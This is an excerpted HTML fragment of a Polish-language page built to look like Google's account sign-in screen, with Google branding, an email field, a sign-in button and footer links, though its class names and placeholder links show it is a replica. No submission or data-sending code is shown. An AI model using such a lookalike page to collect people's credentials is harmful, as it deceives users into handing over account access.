	...
	<body>
		<div class="wrapper">
			...
			<div class="main content clearfix">
				<div class="banner">
					<h1> Jedno konto. Wszystkie usługi Google </h1>
					<h2 class="hidden-small"> Zaloguj się przy użyciu swojego konta Google </h2>
				</div>
								...
								<div class="slide-out">
									<div class="input-wrapper focused">
										<div id="identifier-shown">
											<div>
												<label class="hidden-label" for="Email"> Twój e-mail</label>
												<input id="Email" type="email" value="" spellcheck="false" name="Email" placeholder="Twój e-mail" autofocus="">
									...
									<input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Zaloguj się">
									<a class="need-help" href="#"> Zapomniałeś hasła? </a>
								</div>
							</div>
						...
						<div class="card-mask">
							<div class="one-myweb">
								<p class="create-account">
									...
									<span id="link-signup"> <a href="#"> Załóż konto </a> </span>
								</p>
								<p class="tagline">
									Jedno konto dla wszystkich usług Google
								</p>
			...
			<div class="myweb-footer-bar">
				<div class="footer content clearfix">
					<ul id="footer-list">
						<li>
							<a href="#" target="_blank"> Zabezpieczenia </a>
						</li>
						<li>
							<a href="#/TOS?loc=LK&amp;hl=en&amp;privacy=true" target="_blank"> Polityka prywatności </a>
						</li>
						<li>
							<a href="#/TOS?loc=LK&amp;hl=en" target="_blank"> Zasady i warunki </a>
						</li>
						<li>
